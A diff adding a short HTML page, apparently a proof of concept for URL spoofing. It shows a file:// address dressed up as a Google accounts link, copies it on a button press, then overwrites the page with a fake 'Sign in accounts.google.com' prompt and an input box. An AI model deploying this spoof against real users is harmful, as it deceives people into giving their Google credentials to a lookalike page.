@@ -1,0 +1,24 @@
+
+<html>
+	<head></head>
+	<body>
+		Visit this link: <span id="304url">file://www.verylongurl.googlecloudplatform.accounts.google.com/</span> (please copy and paste into your address bar)<br>
+		<button onclick="copyUrl();">copy url</button>
+		<script>
+		
+
+			function copyUrl(){
+				const url = document.getElementById("304url");
+				if(!window.getSelection) return;
+				var range = document.createRange();
+				range.selectNodeContents(url);
+				var sel = window.getSelection();
+				sel.removeAllRanges();
+				sel.addRange(range);
+				document.execCommand("copy");
+				
+				setTimeout('document.write("Sign in accounts.google.com <input />")', 4300);
+			}
+		</script>
+	</body>
+</html>
